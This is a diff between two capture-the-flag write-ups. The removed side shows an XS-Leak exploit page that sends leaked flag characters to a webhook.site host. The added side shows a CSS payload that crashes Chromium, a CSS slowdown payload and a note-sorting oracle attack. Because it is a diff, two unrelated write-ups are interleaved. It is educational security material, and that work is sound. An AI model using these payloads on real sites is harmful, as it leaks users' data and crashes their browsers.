@@ -1,173 +1,201 @@
-And this challenge also has an admin bot that will visit the page you provide, so it is obviously an XSLeaks challenge.
+However, it seems that we cannot send requests to external resources. So, either we need to find a bypass (such as DNS prefetch, but it may not be applicable to this challenge), or we need to combine it with other parts of the challenge.
 
-First, let's take a look at the code for this admin bot:
+The operation of the bot in this challenge is different:
 
 ``` js
-const visit = async (browser, path) =>{
-    let site = process.env.NOTE_SITE ?? ""
-    let url = new URL(path, site)
-    console.log(`[+]${opt.name}: ${url}`)
-    let renderOpt = {...opt}
-    try {
-        const loginpage = await browser.newPage()
-        await loginpage.goto( site+"/signin")
-        await loginpage.type("input[name=username]", "admin")
-        await loginpage.type("input[name=password]", process.env.NOTE_ADMIN_PASS)
-        await Promise.all([
-            loginpage.click('button[name=submit]'),
-            loginpage.waitForNavigation({waitUntil: 'networkidle0', timeout: 2000})
-        ])
-        await loginpage.goto("about:blank")
-        await loginpage.close()
+import { createServer } from 'http';
+import { readFileSync } from 'fs';
+import { spawn } from 'child_process'
+import { randomInt } from 'crypto';
 
-        const page = await browser.newPage()
-        await page.goto(url.href, {waitUntil: 'networkidle0', timeout: 2000})
+const sleep = timeout => new Promise(resolve => setTimeout(resolve, timeout));
+const wait = child => new Promise(resolve => child.on('exit', resolve));
+const index = readFileSync('index.html', 'utf-8');
 
-        await delay(5000) /// waiting 5 second.
+let token = randomInt(2 ** 24).toString(16).padStart(6, '0');
+let browserOpen = false;
 
-    }catch (e) {
-        console.log(e)
-        renderOpt.message = "error occurred"
-        return renderOpt
-    }
-    renderOpt.message = "admin will view your report soon"
-    return renderOpt
+const visit = async code => {
+  browserOpen = true;
+  const proc = spawn('node', ['visit.js', token, code], { detached: true });
+
+  await Promise.race([
+    wait(proc),
+    sleep(10000)
+  ]);
+
+  if (proc.exitCode === null) {
+    process.kill(-proc.pid);
+  }
+  browserOpen = false;
 }
+
+createServer(async (req, res) => {
+  const url = new URL(req.url, 'http://localhost/');
+  if (url.pathname === '/') {
+    return res.end(index);
+  } else if (url.pathname === '/bot') {
+    if (browserOpen) return res.end('already open!');
+    const code = url.searchParams.get('code');
+    if (!code || code.length > 1000) return res.end('no');
+    visit(code);
+    return res.end('visiting');
+  } else if (url.pathname === '/flag') {
+    if (url.searchParams.get('token') !== token) {
+      res.end('wrong');
+      await sleep(1000);
+      process.exit(0);
+    }
+    return res.end(process.env.FLAG ?? 'dice{flag}');
+  }
+  return res.end();
+}).listen(8080);
 ```
 
-The key is this line: `let url = new URL(path, site)`. At first glance, you might think you can only provide pages on the site, so you need to find XSS on this challenge. But that's not the case. If you look carefully at the [documentation](https://nodejs.org/api/url.html#new-urlinput-base), you will know:
+If `browserOpen` is true, we can obtain information from the response. So, when I saw the challenge, I had an idea: what would happen if we crash Chromium? Can we leak the token using this method?
 
-> input: The absolute or relative input URL to parse. If input is relative, then base is required. If input is absolute, the base is ignored
+For example, if we write a CSS rule like `h1[data-token^="0"] { /*crash*/ }` to crash Chromium, it might speed up or slow down the execution of the bot, allowing us to determine if this selector matches.
 
-If you provide an absolute URL, the base will be ignored, so you can directly provide any page for the admin bot to visit.
-
-Next is to find out how to perform XS leak. I used the [history.length](https://xsleaks.dev/docs/attacks/navigations/) trick in the end. The principle is very simple. Even if you go to another website under the same window, your `history.length` will not be cleared, meaning that if I go to website A first, then to B, and then back to A, when I access `history.length`, it will be 3.
-
-So we can use `var win = window.open` to open the note search page, and then after a certain amount of time, use `win.location = '...'` to redirect this window back to our own website, so we can use `win.history.length` to access this value and know whether the note search was successful.
-
-The script I used to leak looks like this:
+Later, my teammate found a way to crash Chromium from the Chromium issues:
 
 ``` html
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="utf-8">
-  <meta name="robots" content="noindex">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="X-UA-Compatible" content="ie=edge">
-</head>
-
-<body>
-    <script>
-      var flag = 'SUSCTF{'
-      function send(msg) {
-        fetch('https://webhook.site/bad84752-95a1-45c4-8395-e5577ea1112b?msg=' + encodeURIComponent(msg))
-      }
-      function trying(keyword) {
-        return new Promise(resolve => {
-          var win = window.open('http://123.60.29.171:10001/search?q=' + keyword)
-          setTimeout(() => {
-            win.location = 'http://e050-220-133-126-220.ngrok.io/non.html'
-            setTimeout(() => {
-              if (win.history.length === 3) {
-                send('success:' + keyword)
-              } else {
-                //send('fail:' + keyword)
-              }
-              win.close();
-            }, 1000)
-          }, 1500)
-        })
-      }
-
-      async function run() {
-        send('start')
-        // }abcdefghijklmnopqrstuvwxyz0123456789_
-        // }abcdefghijklmnopqrs
-        // 
-        let chars = '_abcdefghijklmnopqrstuv'.split('')
-        //let chars = '}wxyz0123456789_'.split('')
-        for(let char of chars) {
-          const temp = flag + char
-          trying(temp)
-        }
-      }
-
-      setTimeout(() => {
-        run()
-      }, 1000)
-      
-    </script>
-</body>
-</html>
+<style>
+  h1[data-token^="a"] {
+    --c1: color-mix(in srgb, blue 50%, red);
+    --c2: srgb(from var(--c1) r g b);
+    background-color: var(--c2);
+  }
+</style>
 ```
 
-There are actually a few details here. The first detail is the last part:
+In the post-competition discussion, I also saw someone in Discord posting a payload that made the webpage load extremely slowly, achieving a similar effect. This is what @Trixter posted:
 
-``` js
-setTimeout(() => {
-  run()
-}, 1000)
+``` html
+<style>
+  html:has([data-token^="a"]) {
+      --a: url(/?1),url(/?1),url(/?1),url(/?1),url(/?1);
+      --b: var(--a),var(--a),var(--a),var(--a),var(--a);
+      --c: var(--b),var(--b),var(--b),var(--b),var(--b);
+      --d: var(--c),var(--c),var(--c),var(--c),var(--c);
+      --e: var(--d),var(--d),var(--d),var(--d),var(--d);
+      --f: var(--e),var(--e),var(--e),var(--e),var(--e);
+  }
+</style>
+<style>
+  *{
+    background-image: var(--f)
+  }
+</style>
 ```
 
-Why wait for one second before starting to run? Because the bot has a piece of code that is:
+It's somewhat similar to the Billion Laughs attack, constructing a super large payload repeatedly to slow down the speed.
 
-``` js
-await page.goto(url.href, {waitUntil: 'networkidle0', timeout: 2000})
-await delay(5000) /// waiting 5 second.
-```
+After slowing down the speed, we can measure the time it takes for the webpage to load using the method mentioned earlier. If it exceeds 10 seconds, it will time out, allowing us to leak the flag.
 
-It waits for `networkidle0` before waiting for five seconds. I tried it myself and found that if I didn't stop for a second and started running directly, `networkidle0` wouldn't seem to trigger. So it becomes running to `timeout: 2000`, with only 2 seconds of execution time, and everything will fail. Later, I added this part.
+## web/safestlist (2 solves)
 
-The second detail is the number of seconds in this section:
+This challenge is a modified version of a challenge I previously solved: [SekaiCTF 2022 Notes and concurrent limit](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/). Let me briefly describe the modified version.
 
-``` js
-setTimeout(() => {
-  win.location = 'http://e050-220-133-126-220.ngrok.io/non.html'
-  setTimeout(() => {
-    if (win.history.length === 3) {
-      send('success:' + keyword)
-    } else {
-      //send('fail:' + keyword)
+This challenge is a classic note app. You can create new notes, but the problem is that the note content will be sanitized using `DOMPurify.sanitize`, so XSS is not possible. The CSP part is `default-src 'self'`, which means that requests can only be sent to the origin of the challenge.
+
+In other words, you cannot send requests outside.
+
+In addition to creating notes, you can also delete notes using the index of the note.
+
+The core of this problem is the code for creating a note:
+
+```js
+fastify.post("/create", (req, reply) => {
+    const { text } = req.body;
+    if (!text || typeof text !== "string") {
+        return reply.type("text/html").send("Missing text");
     }
-    win.close();
-  }, 1000) // 這裡
-}, 1500) // 跟這裡
+
+    const userNotes = notes.get(req.cookies.id) ?? [];
+    const totalLen = userNotes.reduce((prev, curr) => prev + curr.length, 0);
+
+    const newLen = totalLen + text.length;
+    if (newLen > 16384) {
+        return reply.redirect(`/?message=Cannot add, please delete some notes first (${newLen} > 16384 chars)`);
+    }
+
+    userNotes.push(text);
+    userNotes.sort();
+    notes.set(req.cookies.id, userNotes);
+
+    reply.redirect("/?message=Note added successfully");
+});
 ```
 
-This is a value that I manually tried a few times and found to be ok. Because if there is a note search, it will redirect after 1 second. If it redirects back to its own page earlier than this value, it will fail. So I chose 1.5 seconds, and it takes another second to redirect back to its own page. If you want to be more precise, you can use [Cross-window Timing Attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks), which can be much more accurate.
+Note the `userNotes.sort();`, which sorts the notes based on their content. The format of the flag is `dice{[a-z]+}`. By using this sorting feature, a simple strategy can be derived.
 
-The last detail is this part: `let chars = '_abcdefghijklmnopqrstuv'.split('')`. Because my script runs too slowly, if I want to leak all characters (38 in total), it will not finish running. So I have to manually cut it in half and submit the URL twice to leak out one character.
+Assuming the flag is `dice{c}`, and we first create a note with `dice{a`, after creating it, we delete the first note. At this point, `dice{a` will be deleted, leaving the flag `dice{c}`.
 
-I feel that there should be a faster way, such as leaking all characters within 5 seconds. If anyone knows how to do it, please leave a comment to point it out. But anyway, I didn't think about it so much when I was doing this problem, so I submitted it manually one by one, spending the longest time on Google reCAPTCHA. Fortunately, the admin bot has three streams, otherwise the images will be added with noise directly towards the end, and it will be super difficult for the human eye to read...
+If we first create a note with `dice{d`, and then delete the first one, `dice{c}` will be deleted, leaving the newly created `dice{d`.
 
-Fortunately, the flag for this problem is not long. It took almost 20 minutes to submit the URL and pass the verification, slowly getting the characters out.
+In other words, depending on the order of creation and deletion of notes, the note that remains will be different.
 
-When I wrote this, I suddenly thought that I should run all the characters without adding a prefix first, so I can know which characters are in the flag, and the character set may be reduced to more than 10, which will be three times faster... I didn't think of it at the time, I should remember it next time.
+If I can know which note remains in the end, I can infer the order of the flag. If the note I created remains, it means that the flag must be at the beginning and in lexicographical order.
 
-(Supplement: I looked at the [official writeup](https://github.com/susers/SUSCTF2022_official_wp/blob/main/checkin%20%26%20ez_note%20%26%20rubbish_maker_zh.md), and it seems that it is possible to run all the characters in one go, maybe I didn't test it well at the time, and the official answer is also to submit multiple times, not all within 5 seconds.)
+Therefore, the key to this problem is how to know which note remains.
 
-## web/baby gadget v1.0(14 solves)
+Based on last year's solution, my initial idea was to make the server side busy. Node.js is single-threaded, so it cannot handle other requests until it finishes processing one (asynchronous is a different story).
 
-![](/img/susctf-2022-writeup/p3.png)
+So my idea is to create a note with a bunch of `<img src=/?{random_number}>`, which can send about 700-1000 requests within the word limit. By sending a bunch of requests to the server, we make the server busy.
 
-This problem has a login page, and my teammate found that using `/;admin/` can bypass it and enter the backend. The backend is quite simple, just like the screenshot above, and there is a place to download the file `lib.zip`, which contains the following packages used:
+There is another difference in this problem, which is the bot:
 
-1. commons-lang.jar
-2. fastjson-1.2.48.jar
-3. flex-messaging-core.jar
-4. quartz.jar
+``` js
+const visit = async (url) => {
+    // clear all data
+    await fsp.rm(tmpDir, { recursive: true, force: true });
 
-And the description of the backend is also obviously related to fastjson:
+    let browser;
+    try {
+        browser = await launchBrowser();
+        let page = await browser.newPage();
 
-> Fastjson is a Java library that can be used to convert Java Objects into their JSON representation. It can also be used to convert a JSON string to an equivalent Java object. Fastjson can work with arbitrary Java objects including pre-existing objects that you do not have source-code of.
+        // set flag
+        await page.goto("http://localhost:3000", { timeout: 7500, waitUntil: "networkidle2" });
+        await sleep(2000);
+        await page.evaluate((flag) => {
+            document.querySelector("input[type=text]").value = flag;
+            document.querySelector("form[action='/create']").submit();
+        }, FLAG);
+        await page.waitForNavigation({ waitUntil: "networkidle2" });
 
-There is also an endpoint that can POST data:
+        // restart browser, which should close all windows
+        await browser.close();
+        browser = await launchBrowser();
+        page = await browser.newPage();
 
+        // go to the submitted site
+        await page.goto(url, { timeout: 7500, waitUntil: "networkidle2" })
+
+        // restart browser, which should close all windows
+        await browser.close();
+        browser = await launchBrowser();
+        page = await browser.newPage();
+
+        // check on notes now that all other windows are closed
+        await page.goto("http://localhost:3000", { timeout: 7500, waitUntil: "networkidle2" });
+        await sleep(8000);
+        await page.evaluate(() => {
+            document.querySelector("form[action='/view']").submit();
+        });
+        await page.waitForNavigation({ waitUntil: "networkidle2" });
+        await browser.close();
+        browser = null;
+    } catch (err) {
+        console.log(err);
+    } finally {
+        if (browser) await browser.close();
+    }
+};
 ```
-POST /admin/mailbox.jsp
 
-inpututext=abcde
-```
+After accessing the URL we provided, the bot visits the `/view` page. Therefore, we cannot measure the time from the browser this time, but we have to measure it from our local machine. If the idea mentioned earlier is correct, the server response time should be slower.
 
-This version of fastjson has a deserialization vulnerability, which can refer to this article: [Red Team Arsenal: fastjson less than 1.2.68 full vulnerability RCE exploit](https://zeo.cool/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp/).
+But after trying for about three or four hours, I found that it didn't work.
+
+There are two reasons for this. First, the server processing speed is too fast. I tested sending 500 requests to localhost, and it took about 400ms to process them. Second, it is difficult to capture the time interval. It is difficult to grasp the time when the bot visits `/view`.
